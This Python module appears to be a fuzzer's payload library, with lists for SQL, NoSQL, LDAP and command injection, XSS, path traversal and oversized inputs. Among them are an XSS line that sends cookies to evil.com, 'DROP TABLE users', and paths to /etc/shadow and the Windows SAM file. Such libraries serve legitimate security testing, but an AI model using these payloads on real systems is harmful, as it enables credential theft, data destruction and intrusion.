"""
Payload Composables - Strategic Attack Vectors

Reusable payload generation composables that provide specialized attack vectors for different types of endpoints. Each composable serves a specific purpose in systematic vulnerability testing.
"""

from dataclasses import dataclass
from typing import Any


@dataclass
class PayloadSet:
    """Container for organized payload sets."""

    name: str
    payloads: list[Any]
    description: str


class PayloadComposables:
    """
    Payload Composables - Strategic Attack Vector Generator

    This composable provides organized, reusable payload sets for different types of attacks. Each method returns a PayloadSet containing related attack vectors that can be used across multiple fuzzer types.

    Example:
        >>> composables = PayloadComposables()
        >>> sql_payloads = composables.get_sql_injection_payloads()
        >>> for payload in sql_payloads.payloads:
        ...     # Use payload in fuzzing
    """

    @staticmethod
    def get_sql_injection_payloads() -> PayloadSet:
        """
        Get SQL injection payloads for database attacks.

        *fox database hunting* Provides comprehensive SQL injection
        payloads targeting different database systems and injection points.

        Returns:
            PayloadSet: SQL injection payloads with metadata
        """
        payloads = [
            "' OR 1=1 --",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "' or '1'='1",
            "' OR 1=1 LIMIT 1--",
            "admin' OR 'x'='x",
            "' UNION SELECT username,password FROM users--",
            "'; DROP TABLE users; --",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 GROUP BY 1--",
            "' OR 1=1 HAVING 1=1--",
            "' OR 1=1 UNION SELECT 1,2,3--",
            "' OR 1=1 AND 1=1--",
            "' OR 1=1 OR 1=1--",
            "' OR 1=1 /*",
            "' OR 1=1 #",
            "' OR 1=1; --",
            "admin' OR '1'='1' --",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1 UNION SELECT version()--",
            "' OR 1=1 UNION SELECT user()--",
            "' OR 1=1 UNION SELECT database()--",
            "' OR 1=1 UNION SELECT table_name FROM information_schema.tables--",
            "' OR 1=1 UNION SELECT column_name FROM information_schema.columns--",
        ]

        return PayloadSet(
            name="SQL Injection",
            payloads=payloads,
            description="Comprehensive SQL injection payloads for database attacks",
        )

    @staticmethod
    def get_xss_payloads() -> PayloadSet:
        """
        Get XSS payloads for cross-site scripting attacks.

        *fox web hunting* Provides comprehensive XSS payloads targeting
        different contexts and bypass techniques.

        Returns:
            PayloadSet: XSS payloads with metadata
        """
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "javascript:alert('XSS')",
            "vbscript:alert('XSS')",
            "onload=alert('XSS')",
            "onerror=alert('XSS')",
            "onclick=alert('XSS')",
            "onmouseover=alert('XSS')",
            "<script>document.location='http://evil.com'</script>",
            "<script>document.cookie</script>",
            "<script>new Image().src='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>fetch('/admin/delete-all')</script>",
            "<script>XMLHttpRequest</script>",
        ]

        return PayloadSet(
            name="XSS",
            payloads=payloads,
            description="Comprehensive XSS payloads for cross-site scripting attacks",
        )

    @staticmethod
    def get_path_traversal_payloads() -> PayloadSet:
        """
        Get path traversal payloads for directory traversal attacks.

        *fox file system hunting* Provides comprehensive path traversal
        payloads targeting different operating systems and file systems.

        Returns:
            PayloadSet: Path traversal payloads with metadata
        """
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/cmdline",
            "../../../var/log/auth.log",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../etc/shadow",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\services",
            "../../../etc/hosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\protocols",
            "../../../etc/group",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\networks",
            "../../../etc/sudoers",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.allow",
            "../../../etc/crontab",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.deny",
            "../../../etc/ssh/sshd_config",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts",
            "../../../etc/motd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\networks",
            "../../../etc/issue",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\protocols",
            "../../../etc/redhat-release",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\services",
            "../../../etc/debian_version",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../etc/os-release",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.allow",
            "../../../etc/lsb-release",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.deny",
            "../../../etc/issue.net",
        ]

        return PayloadSet(
            name="Path Traversal",
            payloads=payloads,
            description="Comprehensive path traversal payloads for directory traversal attacks",
        )

    @staticmethod
    def get_command_injection_payloads() -> PayloadSet:
        """
        Get command injection payloads for system command execution.

        *fox system hunting* Provides comprehensive command injection
        payloads targeting different shell environments and command separators.

        Returns:
            PayloadSet: Command injection payloads with metadata
        """
        payloads = [
            "; ls -la",
            "| whoami",
            "` id `",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "` cat /etc/passwd `",
            "$(cat /etc/passwd)",
            "; uname -a",
            "| uname -a",
            "` uname -a `",
            "$(uname -a)",
            "; ps aux",
            "| ps aux",
            "` ps aux `",
            "$(ps aux)",
            "; netstat -an",
            "| netstat -an",
            "` netstat -an `",
            "$(netstat -an)",
            "; ifconfig",
            "| ifconfig",
            "` ifconfig `",
            "$(ifconfig)",
            "; df -h",
            "| df -h",
            "` df -h `",
            "$(df -h)",
            "; free -m",
            "| free -m",
            "` free -m `",
            "$(free -m)",
            "; w",
            "| w",
            "` w `",
            "$(w)",
            "; last",
            "| last",
            "` last `",
            "$(last)",
            "; history",
            "| history",
            "` history `",
            "$(history)",
        ]

        return PayloadSet(
            name="Command Injection",
            payloads=payloads,
            description="Comprehensive command injection payloads for system command execution",
        )

    @staticmethod
    def get_nosql_injection_payloads() -> PayloadSet:
        """
        Get NoSQL injection payloads for NoSQL database attacks.

        *fox NoSQL hunting* Provides comprehensive NoSQL injection
        payloads targeting MongoDB, CouchDB, and other NoSQL systems.

        Returns:
            PayloadSet: NoSQL injection payloads with metadata
        """
        payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
            '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$where": "function() { return true; }"}',
            '{"$where": "this.username.match(/.*/)"}',
            '{"$ne": ""}',
            '{"$gt": null}',
            '{"$lt": null}',
            '{"$gte": ""}',
            '{"$lte": ""}',
            '{"$in": ["admin", "root", "user"]}',
            '{"$nin": ["guest", "anonymous"]}',
            '{"$exists": true}',
            '{"$exists": false}',
            '{"$type": "string"}',
            '{"$type": "number"}',
            '{"$type": "boolean"}',
            '{"$type": "object"}',
            '{"$type": "array"}',
            '{"$type": "null"}',
            '{"$type": "undefined"}',
            '{"$all": ["admin", "root"]}',
            '{"$elemMatch": {"username": "admin"}}',
            '{"$size": 0}',
            '{"$size": 1}',
            '{"$mod": [2, 0]}',
            '{"$mod": [1, 0]}',
            '{"$text": {"$search": "admin"}}',
        ]

        return PayloadSet(
            name="NoSQL Injection",
            payloads=payloads,
            description="Comprehensive NoSQL injection payloads for NoSQL database attacks",
        )

    @staticmethod
    def get_ldap_injection_payloads() -> PayloadSet:
        """
        Get LDAP injection payloads for LDAP directory attacks.

        *fox directory hunting* Provides comprehensive LDAP injection
        payloads targeting Active Directory and other LDAP systems.

        Returns:
            PayloadSet: LDAP injection payloads with metadata
        """
        payloads = [
            "*",
            "*)(&",
            "*)(|",
            "*)(|(objectClass=*",
            "*)(|(objectClass=user",
            "*)(|(objectClass=person",
            "*)(|(objectClass=organizationalPerson",
            "*)(|(objectClass=inetOrgPerson",
            "*)(|(objectClass=group",
            "*)(|(objectClass=groupOfNames",
            "*)(|(objectClass=groupOfUniqueNames",
            "*)(|(objectClass=organizationalUnit",
            "*)(|(objectClass=domain",
            "*)(|(objectClass=country",
            "*)(|(objectClass=locality",
            "*)(|(objectClass=organization",
            "*)(|(objectClass=organizationalUnit",
            "*)(|(objectClass=groupOfNames",
            "*)(|(objectClass=groupOfUniqueNames",
            "*)(|(objectClass=organizationalPerson",
            "*)(|(objectClass=inetOrgPerson",
            "*)(|(objectClass=person",
            "*)(|(objectClass=user",
            "*)(|(objectClass=computer",
            "*)(|(objectClass=contact",
            "*)(|(objectClass=container",
            "*)(|(objectClass=country",
            "*)(|(objectClass=dcObject",
            "*)(|(objectClass=device",
            "*)(|(objectClass=distinguishedName",
        ]

        return PayloadSet(
            name="LDAP Injection",
            payloads=payloads,
            description="Comprehensive LDAP injection payloads for LDAP directory attacks",
        )

    @staticmethod
    def get_special_character_payloads() -> PayloadSet:
        """
        Get special character payloads for input validation testing.

        *fox edge case hunting* Provides comprehensive special character
        payloads for testing input validation and parsing vulnerabilities.

        Returns:
            PayloadSet: Special character payloads with metadata
        """
        payloads = [
            "\x00",
            "\n",
            "\r\n",
            "\\",
            '"',
            "'",
            "`",
            "|",
            "&",
            ";",
            "<",
            ">",
            "{",
            "}",
            "[",
            "]",
            "(",
            ")",
            "=",
            "+",
            "-",
            "*",
            "/",
            "%",
            "!",
            "@",
            "#",
            "$",
            "^",
            "~",
            "?",
            ":",
            "\t",
            "\r",
            "\f",
            "\v",
            "\a",
            "\b",
            "\\e",
            "\033",
            "\x1b",
            "\u0000",
            "\u0001",
            "\u0002",
            "\u0003",
            "\u0004",
            "\u0005",
            "\u0006",
            "\u0007",
            "\u0008",
            "\u0009",
            "\u000a",
            "\u000b",
            "\u000c",
            "\u000d",
            "\u000e",
            "\u000f",
        ]

        return PayloadSet(
            name="Special Characters",
            payloads=payloads,
            description="Comprehensive special character payloads for input validation testing",
        )

    @staticmethod
    def get_unicode_payloads() -> PayloadSet:
        """
        Get Unicode payloads for internationalization testing.

        *fox global hunting* Provides comprehensive Unicode payloads
        for testing internationalization and character encoding vulnerabilities.

        Returns:
            PayloadSet: Unicode payloads with metadata
        """
        payloads = [
            "测试",
            "тест",
            "اختبار",
            "テスト",
            "테스트",
            "🧪",
            "🚀",
            "💀",
            "🔥",
            "⚡",
            "🎯",
            "🦊",
            "🐺",
            "🦦",
            "αβγδε",
            "абвгде",
            "أبتثجح",
            "あいうえお",
            "가나다라마",
            "αβγδεζηθικλμνξοπρστυφχψω",
            "абвгдеёжзийклмнопрстуфхцчшщъыьэюя",
            "أبتثجحخدذرزسشصضطظعغفقكلمنهوي",
            "あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん",
            "가나다라마바사아자차카타파하",
            "𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ",
            "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙",
            "𝒜ℬ𝒞𝒟ℰℱ𝒢ℋℐ𝒥𝒦ℒℳ𝒩𝒪𝒫𝒬ℛ𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵",
            "𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩",
            "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ",
        ]

        return PayloadSet(
            name="Unicode",
            payloads=payloads,
            description="Comprehensive Unicode payloads for internationalization testing",
        )

    @staticmethod
    def get_oversized_payloads() -> PayloadSet:
        """
        Get oversized payloads for buffer overflow and DoS testing.

        *fox resource hunting* Provides comprehensive oversized payloads
        for testing buffer overflow vulnerabilities and resource exhaustion.

        Returns:
            PayloadSet: Oversized payloads with metadata
        """
        payloads = [
            "a" * 1000,
            "a" * 10000,
            "a" * 100000,
            "A" * 1000,
            "1" * 1000,
            "0" * 1000,
            " " * 1000,
            "\x00" * 1000,
            "test" * 250,  # 1000 characters
            "test" * 2500,  # 10000 characters
            "test" * 25000,  # 100000 characters
            "A" * 10000,
            "1" * 10000,
            "0" * 10000,
            " " * 10000,
            "\x00" * 10000,
            "A" * 100000,
            "1" * 100000,
            "0" * 100000,
            " " * 100000,
            "\x00" * 100000,
            "test" * 100,  # 400 characters
            "test" * 1000,  # 4000 characters
            "test" * 10000,  # 40000 characters
            "test" * 100000,  # 400000 characters
            "A" * 1000 + "B" * 1000,  # Mixed characters
            "1" * 1000 + "2" * 1000,  # Mixed numbers
            "a" * 1000 + "A" * 1000,  # Mixed case
            "test" * 100 + "TEST" * 100,  # Mixed case words
            "a" * 1000 + "\n" + "b" * 1000,  # With newlines
        ]

        return PayloadSet(
            name="Oversized",
            payloads=payloads,
            description="Comprehensive oversized payloads for buffer overflow and DoS testing",
        )

    @staticmethod
    def get_boolean_parameter_variations() -> PayloadSet:
        """
        Get boolean parameter variations for parameter manipulation testing.

        *fox parameter hunting* Provides comprehensive boolean parameter
        variations for testing parameter parsing and validation.

        Returns:
            PayloadSet: Boolean parameter variations with metadata
        """
        payloads = [
            {"value": "true"},
            {"value": "false"},
            {"value": "1"},
            {"value": "0"},
            {"value": "null"},
            {"value": "undefined"},
            {"value": "' OR 1=1 --"},
            {"value": "<script>alert('XSS')</script>"},
            {"value": "yes"},
            {"value": "no"},
            {"value": "on"},
            {"value": "off"},
            {"value": "enabled"},
            {"value": "disabled"},
            {"value": "active"},
            {"value": "inactive"},
            {"value": "True"},
            {"value": "False"},
            {"value": "TRUE"},
            {"value": "FALSE"},
            {"value": "Yes"},
            {"value": "No"},
            {"value": "YES"},
            {"value": "NO"},
            {"value": "On"},
            {"value": "Off"},
            {"value": "ON"},
            {"value": "OFF"},
            {"value": "Enabled"},
            {"value": "Disabled"},
            {"value": "ENABLED"},
            {"value": "DISABLED"},
        ]

        return PayloadSet(
            name="Boolean Parameters",
            payloads=payloads,
            description="Comprehensive boolean parameter variations for parameter manipulation testing",
        )

    @staticmethod
    def get_format_parameter_variations() -> PayloadSet:
        """
        Get format parameter variations for content type testing.

        *fox format hunting* Provides comprehensive format parameter
        variations for testing content type parsing and validation.

        Returns:
            PayloadSet: Format parameter variations with metadata
        """
        payloads = [
            {"format": "json"},
            {"format": "xml"},
            {"format": "csv"},
            {"format": "' OR 1=1 --"},
            {"format": "<script>alert('XSS')</script>"},
            {"format": "html"},
            {"format": "text"},
            {"format": "plain"},
            {"format": "application/json"},
            {"format": "application/xml"},
            {"format": "text/csv"},
            {"format": "text/html"},
            {"format": "text/plain"},
            {"format": "application/javascript"},
            {"format": "text/javascript"},
            {"format": "application/x-javascript"},
            {"format": "text/xml"},
            {"format": "application/xhtml+xml"},
            {"format": "image/svg+xml"},
            {"format": "application/rss+xml"},
            {"format": "application/atom+xml"},
            {"format": "application/pdf"},
            {"format": "application/zip"},
            {"format": "application/octet-stream"},
            {"format": "multipart/form-data"},
            {"format": "application/x-www-form-urlencoded"},
            {"format": "application/x-www-form-urlencoded; charset=utf-8"},
            {"format": "application/json; charset=utf-8"},
            {"format": "text/html; charset=utf-8"},
            {"format": "text/plain; charset=utf-8"},
        ]

        return PayloadSet(
            name="Format Parameters",
            payloads=payloads,
            description="Comprehensive format parameter variations for content type testing",
        )
